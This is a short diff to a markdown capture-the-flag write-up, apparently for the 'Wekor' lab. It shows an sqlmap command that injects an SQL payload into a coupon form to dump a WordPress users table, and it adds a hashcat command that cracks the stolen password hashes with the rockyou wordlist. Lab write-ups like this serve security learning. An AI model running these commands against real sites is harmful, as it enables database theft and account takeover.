@@ -51,7 +51,11 @@ Use SQLMAP to pull specific database and table
 ```bash
 sqlmap -u http://${URL}/it-next/it_cart.php --forms "coupon_code=%27+or+1+%3D+1+Limit+0%2C+1+--+-&apply_coupon=Apply+Coupon" -D wordpress -T wp_users --dump
 ```
-
+### How to crack the hash with hashcat
+This is after you pull the users from the wordpress database and extract the hash password into a text file
+```bash
+hashcat -a 0 -m 400 hash.txt /usr/share/wordlists/rockyou.txt
+```
 ## Resource
 https://erichogue.ca/2021/06/Wekor
 
